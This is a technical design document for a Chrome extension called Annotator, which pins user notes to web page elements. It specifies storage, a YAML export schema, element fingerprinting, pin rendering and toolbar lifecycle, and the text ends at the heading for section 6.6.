# Annotator — Technical Design Document

## Design Status

**Ready for implementation.** Reviewed by a senior engineer (Critique 1, 2026-05-14) and a principal engineer (Critique 2, 2026-05-14). Critical bugs fixed: reload persistence (`beforeunload` handler), `wasImported` state tracking for confirmation dialogs, content script double-injection race condition (idempotency guard), inverted CSS selector truncation (cap removed), and missing `replaceState` monkey-patch for SPA routing. All known limitations are explicitly documented. A developer can begin implementation from this document.

---

> **Version:** 1.0  
> **Status:** Reviewed — Ready for Implementation  
> **Scope:** Chrome Extension v1

---

## Table of Contents

1. [Architecture Overview](#1-architecture-overview)
2. [Storage](#2-storage)
3. [YAML Schema (Normative)](#3-yaml-schema-normative)
4. [Element Fingerprinting](#4-element-fingerprinting)
5. [Pin Rendering](#5-pin-rendering)
6. [Toolbar Injection & Lifecycle](#6-toolbar-injection--lifecycle)
   - 6.6 [Annotation Mode — Hover & Click Implementation](#66-annotation-mode--hover--click-implementation)
   - 6.7 [Popover Implementation](#67-popover-implementation)
7. [Cross-Tab Sync](#7-cross-tab-sync)
8. [Import Pipeline](#8-import-pipeline)
9. [Export Pipeline](#9-export-pipeline)
10. [Security](#10-security)
11. [Trade-offs & Alternatives Considered](#11-trade-offs--alternatives-considered)

---

## 1. Architecture Overview

### 1.1 Component Breakdown

Annotator is a Manifest V3 Chrome extension with three runtime components:

| Component | File(s) | What it owns |
|---|---|---|
| **Content Script** | `content/index.js` | All in-page UI — toolbar, pins, popover, annotation mode, element fingerprinting, pin rendering |
| **Background Service Worker** | `background.js` | Extension icon click handling; tab activation tracking; injecting the content script on demand |
| **No Popup** | — | Intentionally omitted; the toolbar lives in the page |

There is **no browser popup**. The extension icon click directly injects the toolbar into the active tab. This is the correct model because all meaningful interaction happens in-page.

### 1.2 Why Each Component Exists

**Content Script** does everything the user sees and touches. It runs in the context of the page (isolated JS world, shared DOM), which is the only place pins and the toolbar can exist. It manages:
- Toolbar DOM lifecycle
- Annotation mode (highlight on hover, click-to-annotate, popover)
- Pin rendering and position updates
- Storage reads/writes
- Import/export orchestration

**Background Service Worker** is deliberately thin. Its only jobs are:
1. Listen for `chrome.action.onClicked` (icon click)
2. Check if the content script is already active on that tab (via a `ping` message)
3. If not: inject the content script; if yes: tell it the icon was clicked (no-op per requirements)

The service worker does **not** hold any annotation state. State lives in `chrome.storage.local`.

### 1.3 Message Passing Design

All cross-component communication uses `chrome.runtime.sendMessage` / `chrome.tabs.sendMessage`.

#### Background → Content Script

| Message | When | Payload |
|---|---|---|
| `{ type: "ACTIVATE", tabId: number }` | Icon clicked, content script not yet present | `tabId` — the tab's ID, passed so the content script can identify itself |
| `{ type: "ICON_CLICKED" }` | Icon clicked, content script already active | none |

#### Content Script → Background

| Message | When | Payload |
|---|---|---|
| `{ type: "PING" }` | Background checks if content script is alive | → response: `{ alive: true, tabId: number }` |

**How the content script gets its tab ID:** Content scripts in MV3 cannot reliably self-identify their tab ID (`chrome.tabs.getCurrent()` is undefined in injected content scripts). The background passes the tab ID explicitly:
- On `ACTIVATE`: the background includes `tabId` in the message payload
- On PING: the background includes `tabId` in the response

The content script stores this as `let myTabId = message.tabId` (or `response.tabId`) on receipt and uses it for all `activeTab:{tabId}` storage operations.

#### Storage events (no direct messages)

Cross-tab state updates travel via `chrome.storage.onChanged` events, not direct messages. Each content script instance subscribes to storage changes and re-renders pins when storage mutates. See §7.

### 1.4 Content Script Internal Architecture

The content script is structured as a set of cooperating modules (bundled into one file via a bundler):

```
content/
  index.js          — entry point, sets up everything on inject
  toolbar.js        — toolbar DOM, button state, message display
  annotationMode.js — hover highlight, click interception, popover
  pinRenderer.js    — pin creation, positioning, show/hide
  storage.js        — all chrome.storage.local read/write helpers
  fingerprint.js    — CSS selector / XPath / text capture + resolution
  importExport.js   — YAML parse/validate/serialize, file download
  urlNorm.js        — URL and domain normalization utilities
```

These are logical modules bundled with esbuild (or similar) into a single content script file for simplicity. No module loader at runtime.

---

## 2. Storage

### 2.1 Mechanism: `chrome.storage.local`

**Decision:** Use `chrome.storage.local`.

Rationale:
- Persists across browser restarts (unlike `sessionStorage`)
- Local to device + Chrome profile (no unintended sync)
- ~10MB quota — exceeds the 8MB requirement
- Natively async and available in both content scripts and service workers
- No setup required — works out of the box in MV3

Storage quota handling is **out of scope for v1**. If writes fail due to quota exceeded, the error is silently dropped (the requirements explicitly exclude quota handling).

### 2.2 Storage Schema

All extension data lives under a single top-level key per domain. There is also one global key for tab activation state.

#### Top-Level Keys

| Key Pattern | Type | Purpose |
|---|---|---|
| `annotations:{domain}` | Object | All annotation data for a normalised domain |
| `activeTab:{tabId}` | boolean (`true`) | Present when the toolbar is active on that tab; absent when inactive |

#### Domain Object Structure

```
annotations:{domain}:
  meta:
    nextPinNumber: number        // highest used pin + 1
    importedFilename: string?    // null if no file imported, or if modified after import
    wasImported: boolean         // true if current state originated from an import; never reset on edit
                                 // MUST be set to false on delete-all: if left true, fresh annotations
                                 // created after delete-all incorrectly trigger "unsaved changes" dialog
                                 // (case 12) on the next import instead of "replace annotations" (case 11).
                                 // used to distinguish confirmation dialog #11 vs #12:
                                 //   wasImported && importedFilename === null → "unsaved changes" (case 12)
                                 //   otherwise with annotations present → "replace annotations" (case 11)
    version: number              // storage schema version (currently 1)
  pages:
    {pageUrl}: Annotation[]      // keyed by normalised URL (no params/fragments)
```

#### Annotation Object

```typescript
interface Annotation {
  pinNumber: number;             // globally unique, globally sequential
  note: string;                  // max 400 chars
  fingerprint: Fingerprint;
  offset: { x: number; y: number }; // click point relative to element top-left
  createdAt: string;             // ISO 8601
}

interface Fingerprint {
  // Structural signals — how to find the element
  cssSelector: string;
  xpath: string;
  textSnippet: string;           // first ~50 chars of element text
  tagName: string;               // lowercase

  // Semantic context signals — which element if several are structurally similar.
  // All optional for backward-compat with older fingerprints / imported YAML.
  // See FINGERPRINTING.md for the full capture rules and scoring weights.
  closestLabel?: string;         // aria-label / nearest <label> / nearest heading text
  pageHeading?: string;          // nearest h1–h4 / role="heading" preceding the element
  pageSubHeading?: string;       // deeper heading between pageHeading and the element
  headingPath?: string[];        // full ordered list of preceding headings (cap 10)
  sectionContext?: string;       // data-step / data-page / aria-label on a sectioning ancestor
  siblingText?: string;          // prev + next sibling textContent
  domIndex?: number;             // index among elements sharing the same tag + textSnippet

  // NOTE: boundingBox is intentionally NOT stored. It goes stale on any reflow.
  // Pin position is always recalculated live via getBoundingClientRect() at render time.
}
```

#### Full Concrete Example

```json
{
  "annotations:figma.com": {
    "meta": {
      "nextPinNumber": 5,
      "importedFilename": null,
      "wasImported": false,
      "version": 1
    },
    "pages": {
      "https://www.figma.com/blog/how-we-built-figma": [
        {
          "pinNumber": 1,
          "note": "This is the key architectural insight.",
          "fingerprint": {
            "cssSelector": "#main-content > article > p:nth-of-type(3)",
            "xpath": "/html/body/main/div[2]/article/p[3]",
            "textSnippet": "The challenge was making the rendering engin",
            "tagName": "p"
          },
          "offset": { "x": 120, "y": 20 },
          "createdAt": "2026-05-14T04:30:00.000Z"
        }
      ]
    }
  }
}
```

### 2.3 Domain Key Normalisation

Domain keys are derived from the normalised domain (see §6 URL normalisation). Example: `figma.com`, `app.example.com`, `amazon.com`.

The `www.` prefix is stripped before forming the key, so `www.figma.com` and `figma.com` map to the same key `annotations:figma.com`.

### 2.4 Page URL Normalisation

Page URLs stored as keys within `pages`:
- Scheme is lowercased; hostname is lowercased
- `www.` prefix stripped
- Port ignored
- Path preserved as-is (case-sensitive)
- Trailing slash stripped
- Query params stripped
- Fragment stripped
- `http://` normalised to `https://`

Example: `http://www.figma.com/blog/How-We-Built-Figma?ref=twitter#intro` → `https://figma.com/blog/How-We-Built-Figma`

### 2.5 Pin Number Management

`meta.nextPinNumber` is the source of truth for the next pin number to assign. It is always `max(all existing pinNumbers) + 1`. **Initial value: 1** — on fresh install or immediately after delete-all, there are no existing pins, so `max(empty set) + 1 = 1`. No special-case initialization is needed; the formula self-corrects.

On every annotation write (create), the content script:
1. Reads current storage
2. Assigns `meta.nextPinNumber` to the new pin
3. Writes the new annotation
4. Updates `meta.nextPinNumber = newPin.pinNumber + 1`

On import, `meta.nextPinNumber` is set to `max(importedPins) + 1` regardless of gaps.

On delete: `meta.nextPinNumber` is **not** decremented. Gaps are preserved.

**Known v1 limitation — concurrent multi-tab pin numbering:** The read-then-write sequence is not atomic. Two tabs annotating simultaneously can both read the same `nextPinNumber`, both assign the same pin number, and produce a duplicate. Since `chrome.storage.local` has no transactional writes, this is an inherent constraint in v1. It is accepted under the same "last-write-wins" policy as other concurrent writes (§7.3). Duplicate pin numbers created this way will not surface as import errors for the active session, but a re-exported file with duplicates would fail import on the duplicate check (§3.3 rule 6). The likelihood is low in practice (requires two tabs annotating within the same storage roundtrip window).

### 2.6 Tab Activation State

Each tab where the toolbar is active stores a single key: `activeTab:{tabId}: true`. The key persists until the tab is closed — it is **not** removed on navigation (this is required for reload persistence; see §6.3).

**Why per-tab keys instead of a shared array:** A shared `activeTabIds: number[]` requires all tabs to do read-modify-write operations on the same key. Two tabs registering simultaneously would race and clobber each other's entries. Per-tab keys are independent — each tab owns only its own key and never needs to read others.

The background service worker checks `chrome.storage.local.get('activeTab:' + tabId)` to decide whether to inject or send a no-op. The content script sets `chrome.storage.local.set({ ['activeTab:' + myTabId]: true })` on init.

**Note — `chrome.storage.session` as an alternative:** `chrome.storage.session` (Chrome 102+, MV3 only) is session-scoped and cleared automatically on browser restart, which would eliminate the stale-key problem and the startup cleanup sweep (§6.3). It is a cleaner fit for ephemeral UI state. The current implementation uses `chrome.storage.local` for broad compatibility. See §11.10 for the full trade-off discussion.

---

## 3. YAML Schema (Normative)

### 3.1 Full Schema

```yaml
version: 1                                  # integer — Annotator export format version
exported_at: "2026-05-14T04:30:00.000Z"    # ISO 8601 UTC timestamp
domain: "figma.com"                         # normalised domain (www. stripped)

annotations:
  - pin_number: 1                           # integer, globally unique
    page_url: "https://figma.com/blog/how-we-built-figma"  # normalised URL, no params/fragments
    note: "This is the key architectural insight."          # string, max 400 chars
    fingerprint:
      css_selector: "#main-content > article > p:nth-of-type(3)"
      xpath: "/html/body/main/div[2]/article/p[3]"
      text_snippet: "The challenge was making the rendering engin"  # first ~50 chars
      tag_name: "p"                         # lowercase element tag
    offset:
      x: 120                               # pixels from element left edge
      y: 20                                # pixels from element top edge
    created_at: "2026-05-14T04:30:00.000Z" # ISO 8601 UTC
    FEEDBACK: "This is the key architectural insight."      # string, max 400 chars; placed last for human readability

  - pin_number: 2
    page_url: "https://figma.com/blog/how-we-built-figma"
    fingerprint:
      css_selector: "h2#performance"
      xpath: "/html/body/main/div[2]/article/h2[2]"
      text_snippet: "Performance at Scale"
      tag_name: "h2"
      # Optional semantic-context signals (any of these can be absent).
      # See §4 / FINGERPRINTING.md for what they capture and when they fire.
      closest_label: "Performance at Scale"
      page_heading: "Performance at Scale"
      page_sub_heading: "Render Pipeline"
      heading_path:
        - "How we built Figma"
        - "Architecture"
        - "Performance at Scale"
      section_context: "main-article"
      sibling_text: "Designing for the worst case | The next 10x"
      dom_index: 0
    offset:
      x: 0
      y: 0
    created_at: "2026-05-14T04:31:00.000Z"
    FEEDBACK: "Worth citing in the architecture doc."
```

### 3.2 Field Reference

| Field | Type | Required | Notes |
|---|---|---|---|
| `salamander_version` | string | ✅ | Extension version that produced this file (semver, e.g. `"1.1.0"`). Auto-read from `manifest.json` at export time. Legacy files with `version: <int>` are still accepted on import. |
| `exported_at` | string (ISO 8601) | ✅ | UTC timestamp of export. Human reference only. |
| `domain` | string | ✅ | Normalised domain without `www.`. Validated on import. |
| `annotations` | array | ✅ | May not be empty (rejected on import if empty). |
| `annotations[].pin_number` | integer | ✅ | Must be unique within the file. |
| `annotations[].page_url` | string | ✅ | Normalised URL. No query params or fragments. |
| `annotations[].FEEDBACK` | string | ✅ | Max 400 chars. ALL-CAPS key name and placement at the end of each annotation block are intentional — makes the prose easy to spot when reading raw YAML. Legacy files with lowercase `note:` are still accepted on import. |
| `annotations[].fingerprint` | object | ✅ | Required structural sub-fields below; semantic-context sub-fields are optional. |
| `annotations[].fingerprint.css_selector` | string | ✅ | Full CSS path to element. |
| `annotations[].fingerprint.xpath` | string | ✅ | Absolute XPath from document root. |
| `annotations[].fingerprint.text_snippet` | string | ✅ | May be empty string if element has no text. |
| `annotations[].fingerprint.tag_name` | string | ✅ | Lowercase tag. Used in text-match fallback. |
| `annotations[].fingerprint.closest_label` | string | optional | aria-label / `<label>` / nearest heading text. Trimmed to 80 chars. |
| `annotations[].fingerprint.page_heading` | string | optional | Nearest h1–h4 / role="heading" preceding the element. Trimmed to 80 chars. |
| `annotations[].fingerprint.page_sub_heading` | string | optional | Deeper heading between `page_heading` and the element. Trimmed to 80 chars. |
| `annotations[].fingerprint.heading_path` | string[] | optional | Full ordered list of preceding headings, capped at the 10 most-recent. Each entry trimmed to 80 chars. |
| `annotations[].fingerprint.section_context` | string | optional | data-step / data-page / aria-label of nearest sectioning ancestor. Trimmed to 80 chars. |
| `annotations[].fingerprint.sibling_text` | string | optional | prev + next sibling textContent (` \| ` separated). Trimmed to 60 chars. |
| `annotations[].fingerprint.dom_index` | integer | optional | 0-based index among elements sharing the same `tag_name` + `text_snippet`. |
| `annotations[].offset` | object | ✅ | Click position relative to element top-left. |

> **Backward-compatible additions.** All seven `fingerprint.*` semantic fields above were added incrementally and are written by current builds, but old YAML files lack them. Import handles the absence by leaving the field undefined; the resolver treats a missing/empty stored signal as "no opinion" rather than a mismatch (§4).

> **Note on `boundingBox`:** The internal `Fingerprint` storage interface includes a `boundingBox` field (§2.2). This field is **intentionally excluded from the YAML export** — it is a rendering hint used only at runtime and is not needed for annotation resolution or round-trip fidelity. Do not include it in the export serializer.
| `annotations[].offset.x` | number | ✅ | Pixels. |
| `annotations[].offset.y` | number | ✅ | Pixels. |
| `annotations[].created_at` | string (ISO 8601) | ✅ | UTC. |

### 3.3 Validation Rules (Normative)

On import, all of the following must pass or the file is rejected:

1. File extension is `.yaml` or `.yml`
2. File is non-empty
3. File parses as valid YAML
4. Top-level object has `domain`, `annotations`, and one of `salamander_version` (current) or `version` (legacy)
5. `annotations` is a non-empty array
6. All `annotations[].pin_number` values are unique
7. `domain` matches the normalised domain of the current tab
8. `salamander_version` major version ≤ current major (warn if file major > current major)
9. File size ≤ 8MB
10. Each annotation has all required fields (per-annotation prose field accepted under either `FEEDBACK` or legacy `note`)

### 3.4 Versioning Strategy

The exported `salamander_version` is read live from `manifest.json` via
`chrome.runtime.getManifest().version` — bumping the extension version in the
manifest automatically flows into every subsequent export. No constant to
maintain in `importExport.ts`.

- On a **breaking schema change**, bump the manifest's major version. The import "newer-version" warning compares major segments only.
- On a **backward-compatible addition** (new optional field), no special action: old importers ignore unknown fields, exporters write the new field.
- Files exported by previous Salamander versions (which used `version: 1` and per-annotation `note:`) continue to import without manual conversion — the validator accepts both field names and a normalisation step collapses them into the current shape.

---

## 4. Element Fingerprinting

> **Source of truth:** `src/fingerprint.ts` plus the deep-dive in [FINGERPRINTING.md](FINGERPRINTING.md). This section summarises the approach at the level needed to understand the storage shape (§2.2), the YAML schema (§3), and the failure-mode table below. Read FINGERPRINTING.md for the actual priority ladders, scoring weights, and worked examples.

### 4.1 Capture

When the user clicks an element in annotation mode, `captureFingerprint()` synchronously snapshots both **structural** signals (how to find the element) and **semantic-context** signals (which element, if several are structurally similar). Storage shape: see the `Fingerprint` interface in §2.2.

- `cssSelector` is built by walking from the element up to `<body>`, preferring stable `data-*` attributes → dictionary-word IDs → meaningful classes → `:nth-of-type(n)`. The walk stops as soon as the path is globally unique. Framework-generated identifiers (React `useId` patterns like `:rXX:`, UUIDs, long hex strings, pure-numeric IDs, Radix/MUI/Headless/Chakra prefixes) are rejected so they don't get baked into the selector.
- `xpath` prefers `data-*` → **heading-anchored** (`//h2[normalize-space()="…"]/following::button[normalize-space()="…"][1]`) → dictionary-word IDs → fully positional path. Heading-anchored XPaths are verified to round-trip to the target element before being accepted.
- The **semantic-context** signals (`closestLabel`, `pageHeading`, `pageSubHeading`, `headingPath`, `sectionContext`, `siblingText`, `domIndex`) disambiguate elements that share the same structural fingerprint — e.g. the "Previous" button on different wizard steps, or the same row in a re-sorted list. All are optional; legacy fingerprints without them still resolve.

### 4.2 Resolution

`resolveElement()` is **wide-net + score**, not first-strategy-wins:

1. Collect candidates from three independent strategies (CSS selector / XPath / text+tag), de-duplicated by element identity.
2. Score each candidate via `scoreCandidate()`:
   - **Visibility gate**: invisible candidates (`isVisible()` checks `offsetWidth`/`offsetHeight`, computed `display` / `visibility` / `opacity`) get `−1000` and are disqualified.
   - **Structural base score**: unique CSS = +60, XPath match = +50, unique text+tag = +40, non-unique text+tag = +20, non-unique CSS = +30.
   - **Context bonuses / mismatch penalties**: each captured semantic signal contributes a bonus on match and a penalty on mismatch. The heaviest penalty is `pageHeading` mismatch at −80, because the same button label repeats across wizard steps and the heading is the strongest disambiguator.
   - **Agreement scaling**: the heading-text signals (`closestLabel`, `pageHeading`, `pageSubHeading`) are *match-only* text comparisons that can coincidentally agree across contexts. Their match bonuses are scaled by Jaccard similarity of stored vs. current `headingPath` — strong broader-context agreement gives full bonus, weak agreement scales it down toward zero. Penalties on mismatch stay at full magnitude.
3. Return the highest-scoring candidate if its score clears `MINIMUM_SCORE = 40`; otherwise return `null` (unresolved).

`resolvePageAnnotations()` runs `resolveElement()` for every annotation on the page and returns `{ resolved, unresolvedCount }` for the toolbar alert (§4.4).

### 4.3 Failure Modes

| Failure | Cause | Handling |
|---|---|---|
| CSS selector invalid | Malformed or contains chars illegal in CSS selectors | Caught with try/catch; candidate not added from CSS strategy |
| CSS selector matches the wrong element | Page restructured, auto-generated classes / IDs changed | Other strategies' candidates still scored; context signals discriminate. If the wrong element is the only candidate, context mismatches drive the score below the threshold and resolution returns null |
| CSS selector matches multiple elements | Generic data-attr value (e.g. `action="navigate"` across all wizard nav buttons) | All matching elements scored; context signals pick the best |
| XPath invalid | Very rare; generated paths should always be valid | Caught with try/catch |
| Text snippet is empty | Element had no text at capture time | Text-strategy collects no candidates; CSS / XPath strategies still attempted |
| Element removed from DOM | Dynamic content not present on page load | All three strategies return zero candidates → return null; counted in page-level alert |
| SPA with auto-generated IDs | IDs / data-attrs like `:r9r:` (React useId), `ember123`, `radix-…` change per render | `hasUsableId` / `isStableAttrValue` reject them at capture; resolution falls back to heading-anchored XPath / text+tag / positional path |
| Same button repeats across wizard steps | Component re-rendered with different surrounding content (e.g. shared Cancel button) | `headingPath` set-comparison + agreement-scaled text-match bonuses push the wrong-step candidate below the threshold |
| Element is `aria-hidden`/`inert` but layout-visible | Some component libraries hide panes without `display:none` | Not currently caught by `isVisible()` — known gap. The wrong-context penalties usually still push the score below threshold; if not, this is the failure to investigate first |

### 4.4 Unresolved Annotation Counting

After attempting resolution for all annotations targeting the current page URL, the content script computes:

- `total` = annotations in storage for this page
- `resolved` = those where `resolveElement()` returned non-null
- `unresolved` = `total - resolved`

These counts drive the toolbar alert logic (§6 toolbar lifecycle).

---

## 5. Pin Rendering

### 5.1 Pin DOM Structure

Each pin is a single `<div>` appended directly to `<body>`. Pins use **`position: fixed`** only for fixed-position target elements; all other pins use **`position: absolute`** relative to the document.

```html
<div class="annotator-pin" data-pin-id="1" style="position: absolute; left: 532px; top: 1204px; z-index: 2147483640;">
  <span>1</span>
</div>
```

**Why not Shadow DOM for pins?** Pins must be positioned with document-relative coordinates. Shadow DOM doesn't change positioning behaviour, only style encapsulation. The pin element itself is simple enough that style isolation via a unique class prefix (`annotator-pin`) is sufficient. Shadow DOM would add complexity without benefit here. (The toolbar does use Shadow DOM — see §5.5.)

### 5.2 Style Isolation

All pin styles are defined with high specificity using the `.annotator-pin` prefix and injected as a `<style>` element by the content script. The style block uses `!important` on critical layout properties (position, z-index, display) to prevent page styles from overriding pin visibility.

Pin appearance:
- Shape: circle, 24px diameter
- Background: magenta (`#E040FB`)
- Text: white, bold, 11px, centered
- Border: 2px white solid (visibility on dark backgrounds)
- Cursor: default (pointer)
- No pointer events when annotation mode is off (see §5.4)

### 5.3 Z-Index Strategy

| Layer | Z-index |
|---|---|
| Page content | 0 – 999,999 |
| Page modals/overlays | 1,000,000+ |
| Annotator pins | 2,147,483,640 |
| Annotator toolbar | 2,147,483,644 |
| Annotator popover | 2,147,483,646 |

> **Note on hover highlight:** There is no separate z-indexed overlay element for hover. Hover highlighting is implemented by adding an `annotator-highlighted` CSS class directly to the hovered page element (applying an outline). No overlay div is created or z-indexed.

This ensures annotator UI is always on top. Stacking context issues (elements with `transform`, `filter`, or `isolation: isolate`) can trap child elements below their stacking context ceiling — but since pins are children of `<body>`, this is avoided.

### 5.4 Position Calculation

**For normal (non-fixed) elements:**

```
pinLeft = element.getBoundingClientRect().left + window.scrollX + annotation.offset.x
pinTop  = element.getBoundingClientRect().top  + window.scrollY + annotation.offset.y
```

`window.scrollX/Y` converts viewport-relative rect to document-relative position. The pin uses `position: absolute` on `<body>`.

**For fixed-position elements:**

```
// Detect: window.getComputedStyle(el).position === 'fixed'
// OR: walk up ancestors and check
pinLeft = element.getBoundingClientRect().left + annotation.offset.x
pinTop  = element.getBoundingClientRect().top  + annotation.offset.y
// Pin uses position: fixed
```

Fixed elements don't scroll, so we use viewport coordinates directly. The pin is also set to `position: fixed`.

**Checking if element is fixed:**

```javascript
function isFixedPosition(el) {
  let node = el;
  while (node && node !== document.body) {
    if (window.getComputedStyle(node).position === 'fixed') return true;
    node = node.parentElement;
  }
  return false;
}
```

### 5.5 Toolbar Style Isolation

The toolbar (unlike pins) uses **Shadow DOM** to prevent page styles from leaking in. The toolbar is appended to `<body>` as a `<div id="annotator-host">` with `attachShadow({ mode: 'closed' })`. All toolbar CSS lives inside the shadow root. This is appropriate for the toolbar because it has complex internal structure (buttons, text, alerts) that would be vulnerable to CSS cascade pollution from the page.

**Critical implementation note:** `attachShadow({ mode: 'closed' })` returns the shadow root at creation time. After that, `host.shadowRoot` is `null` — the browser does not expose it externally. The returned reference **must** be stored in module scope:

```javascript
const toolbarHost = document.createElement('div');
toolbarHost.id = 'annotator-host';
const toolbarShadow = toolbarHost.attachShadow({ mode: 'closed' }); // STORE THIS
document.body.appendChild(toolbarHost);
// All subsequent toolbar DOM work uses toolbarShadow, not toolbarHost.shadowRoot
```

### 5.6 Scroll and Resize Behaviour

Pin positions are **recalculated on scroll and resize** by updating the `left` and `top` inline styles on each pin element. A single throttled event listener handles both:

```javascript
const repositionOnScroll = throttle(() => {
  for (const [pinId, { element, offset, isFixed }] of activePins) {
    if (isFixed) continue; // fixed-position pins don't move with scroll; skip to avoid wasteful recalculation
    updatePinPosition(pinId, element, offset, isFixed);
  }
}, 16); // ~60fps cap

const repositionAll = throttle(() => {
  for (const [pinId, { element, offset, isFixed }] of activePins) {
    updatePinPosition(pinId, element, offset, isFixed); // resize can move fixed elements too
  }
}, 16);

window.addEventListener('scroll', repositionOnScroll, { passive: true });
window.addEventListener('resize', repositionAll, { passive: true });
```

`activePins` is a `Map<pinId, { element: HTMLElement, offset: {x,y}, isFixed: bool }>` maintained by the content script.

### 5.7 Show/Hide on Annotation Mode Toggle

- **Annotation mode ON:** all pin elements have `display: block` and `pointer-events: auto`
- **Annotation mode OFF:** all pin elements have `display: none` and `pointer-events: none`

This is handled by toggling a CSS class on `<body>`:
```css
body:not(.annotator-active) .annotator-pin { display: none !important; pointer-events: none !important; }
```

---

## 6. Toolbar Injection & Lifecycle

### 6.1 Injection Flow

1. User clicks extension icon
2. Background service worker receives `chrome.action.onClicked`
3. Background sends `{ type: "PING" }` to the active tab's content script
4. **If ping times out (script not present):** Background calls `chrome.scripting.executeScript` to inject the content script. After injection completes, background sends `{ type: "ACTIVATE", tabId: tab.id }` so the content script knows its own tab ID (see §1.3). Content script calls `init(message.tabId)`. The `executeScript` callback fires after the script has executed synchronously (message listener is registered); `sendMessage` should be wrapped with a `chrome.runtime.lastError` check in case the tab navigated between inject and callback:
   ```javascript
   chrome.scripting.executeScript(
     { target: { tabId }, files: ['content/index.js'] },
     () => {
       if (chrome.runtime.lastError) return; // tab navigated away
       chrome.tabs.sendMessage(tabId, { type: 'ACTIVATE', tabId });
     }
   );
   ```
5. **If ping responds** with `{ alive: true, tabId }`: Background sends `{ type: "ICON_CLICKED" }`. Content script ignores it (toolbar already active — no-op per requirements §6 #18).

The content script is **not** declared in `manifest.json` under `content_scripts`. It is injected on demand only. This prevents the extension from running on every page load when the user hasn't activated it.

### 6.2 Content Script `init(tabId)`

**Idempotency guard — mandatory first line of `content/index.js`:**

```javascript
// Prevents double-injection from rapid navigation (two concurrent onUpdated events
// both completing executeScript against the same page). Without this guard, two content
// scripts run simultaneously: two toolbars, two storage listeners, every storage write
// triggers onChanged twice.
if (window.__annotatorActive) return;
window.__annotatorActive = true;
```

Content scripts in MV3 run in an isolated JS world but share the page's `window` object. Setting `window.__annotatorActive` is visible to all content script instances on the same page context. On full navigation the window is destroyed, so the guard resets naturally without any cleanup.

On first injection (called with the tab ID passed from background via `ACTIVATE` message):
1. Store `myTabId = tabId` in module scope
2. Build and inject toolbar into `<body>` via Shadow DOM host div
3. Register: `chrome.storage.local.set({ ['activeTab:' + myTabId]: true })`
3. Load annotations from storage for the current normalised domain
4. Determine current page URL (normalised)
5. Render pins for annotations matching current page URL
6. Set up `chrome.storage.onChanged` listener
7. Set up URL change detection (for SPA navigation)
8. Set up `window.addEventListener('beforeunload', cleanup)`

### 6.3 Full Page Reload Persistence

When the page reloads:
- The content script is torn down (the page unloads)
- `beforeunload` is fired → content script does **DOM-only cleanup** (removes toolbar and pin elements from the page). **It does NOT remove `activeTab:{tabId}` from storage.** Removing it here would break reload persistence: `onUpdated` fires after `beforeunload`, and if the key is gone, re-injection never happens.

**Mechanism:** On full navigation, `chrome.tabs.onUpdated` fires in the background service worker. When `changeInfo.status === 'complete'` and `activeTab:{tabId}` exists in storage, the background auto-re-injects and sends `ACTIVATE`:

```javascript
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    chrome.storage.local.get('activeTab:' + tabId, (result) => {
      if (result['activeTab:' + tabId]) {
        // Re-inject content script, then send ACTIVATE with tabId
        chrome.scripting.executeScript(
          { target: { tabId }, files: ['content/index.js'] },
          () => chrome.tabs.sendMessage(tabId, { type: 'ACTIVATE', tabId })
        );
      }
    });
  }
});
```

**Edge case — crash/unexpected close:** If Chrome crashes without firing `beforeunload` and `onRemoved`, a stale `activeTab:{tabId}` key may linger. The startup cleanup sweep (below) handles this. If Chrome re-uses the same tab ID on restart (rare), the toolbar would re-inject on that tab — this is acceptable, the user can dismiss it.

**Cleanup on tab close:** `chrome.tabs.onRemoved` deletes the per-tab key:

```javascript
chrome.tabs.onRemoved.addListener((tabId) => {
  chrome.storage.local.remove('activeTab:' + tabId);
});
```

**Startup cleanup:** On background service worker startup, remove stale `activeTab:*` keys for tabs that no longer exist (e.g., after a browser restart where Chrome re-uses tab IDs or doesn't):

```javascript
chrome.runtime.onStartup.addListener(() => {
  chrome.tabs.query({}, (liveTabs) => {
    const liveIds = new Set(liveTabs.map(t => t.id));
    chrome.storage.local.get(null, (all) => {
      const staleKeys = Object.keys(all)
        .filter(k => k.startsWith('activeTab:'))
        .filter(k => !liveIds.has(parseInt(k.split(':')[1])));
      if (staleKeys.length) chrome.storage.local.remove(staleKeys);
    });
  });
});
```

### 6.4 SPA Navigation Detection

SPAs change the URL without triggering a page reload. The content script detects this via two mechanisms:

**1. `popstate` event** — fired when the user clicks the back/forward buttons, or when the SPA calls `history.back()`:
```javascript
window.addEventListener('popstate', handleUrlChange);
```

**2. `hashchange` event** — fired when the URL's hash fragment changes (hash-based routing used by React Router v5 hash mode, Vue Router hash mode, etc.):
```javascript
window.addEventListener('hashchange', handleUrlChange);
```

**3. Monkey-patching `history.pushState` and `history.replaceState`** — fired when the SPA navigates programmatically. Both must be patched: `pushState` handles standard forward navigation; `replaceState` handles redirects, canonical URL normalization, and `navigate(..., { replace: true })` in React Router / Vue Router. Missing `replaceState` leaves entire SPA routing patterns invisible to the content script.

`handleUrlChange` is **debounced at 50ms** because some SPAs (especially during hydration or route transitions) call `pushState`/`replaceState` multiple times in rapid succession. Without debouncing, intermediate states cause pin flicker:

```javascript
const debouncedHandleUrlChange = debounce(handleUrlChange, 50);

const origPush = history.pushState.bind(history);
history.pushState = function(...args) {
  origPush(...args);
  debouncedHandleUrlChange();
};

const origReplace = history.replaceState.bind(history);
history.replaceState = function(...args) {
  origReplace(...args);
  debouncedHandleUrlChange();
};
```

The `popstate` and `hashchange` event listeners pass `debouncedHandleUrlChange` as their handler too, for consistency.

**`handleUrlChange()`:**
1. Compute new normalised URL
2. If URL changed from the last known URL:
   a. Clear rendered pins
   b. Load annotations for the new page from storage
   c. Render pins for the new page
   d. Update toolbar alert (resolution counts)
   e. Store new URL as last known
3. Annotation mode is set to **off** on URL change (user must re-enter for each page)

### 6.5 Toolbar State Machine

```
INACTIVE (no toolbar)
  └─ [icon click] → ACTIVE_IDLE

ACTIVE_IDLE (toolbar visible, annotation mode off)
  ├─ [Start Annotating] → ACTIVE_ANNOTATING
  ├─ [Upload] → [import pipeline]
  ├─ [Export] → [export pipeline]
  └─ [Delete All] → [confirmation → clear storage]

ACTIVE_ANNOTATING (annotation mode on)
  ├─ [Exit] → ACTIVE_IDLE
  ├─ [click element] → POPOVER_OPEN
  └─ [click existing pin] → POPOVER_OPEN (pre-filled)

POPOVER_OPEN
  ├─ [Add] → ACTIVE_ANNOTATING (pin created/updated)
  ├─ [Delete] → ACTIVE_ANNOTATING (pin deleted)
  └─ [✕ / click outside] → ACTIVE_ANNOTATING (no change)
```

### 6.6 Annotation Mode — Hover & Click Implementation

